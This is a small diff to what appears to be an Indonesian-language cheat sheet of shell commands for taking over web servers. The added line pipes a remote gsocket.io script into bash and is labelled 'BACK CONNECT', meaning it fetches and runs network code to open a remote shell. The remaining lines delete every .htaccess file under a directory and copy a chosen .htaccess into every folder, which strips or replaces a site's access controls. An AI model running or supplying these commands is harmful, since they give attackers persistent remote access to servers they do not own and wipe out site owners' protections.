@@ -1,3 +1,5 @@
+bash -c "$(curl -fsSL https://gsocket.io/y)" (BACK CONNECT)
+
 find . -name ".htaccess" -delete ( semua file .htaccess hilang )
 
 find path/path -type d -exec cp file.htaccess {} \; (copy semua file .htaccess ke semua folder)
